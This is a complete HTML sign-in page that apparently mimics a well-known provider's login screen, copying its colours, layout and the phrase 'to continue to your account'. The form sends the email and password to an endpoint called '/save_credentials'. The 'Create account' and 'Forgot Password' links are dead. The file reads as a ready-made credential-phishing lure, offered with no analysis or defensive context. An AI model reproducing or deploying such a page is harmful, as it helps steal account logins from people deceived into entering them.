<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <link rel="icon" href="logo.ico" type="image/x-icon">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .signin-container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 100%;
            max-width: 400px;
        }
        .signin-container img {
            width: 50px;
            height: 50px;
            margin-bottom: 20px;
        }
        .signin-container h1 {
            font-size: 24px;
            color: #202124;
            margin-bottom: 10px;
        }
        .signin-container p {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 30px;
        }
        .signin-container input[type="email"],
        .signin-container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
        }
        .signin-container button {
            width: 100%;
            padding: 10px;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        .signin-container button:hover {
            background-color: #1558b3;
        }
        .signin-container a {
            display: block;
            margin-top: 20px;
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
        }
        .signin-container a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="signin-container">
        <img src="logo.ico" alt="Logo">
        <h1>Sign in</h1>
        <p>to continue to your account</p>
        <form action="/save_credentials" method="POST">
            <input type="email" name="email" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Next</button>
        </form>
        <a href="#">Create account</a>
        <a href="#">Forgot Password</a>
    </div>
</body>
</html>
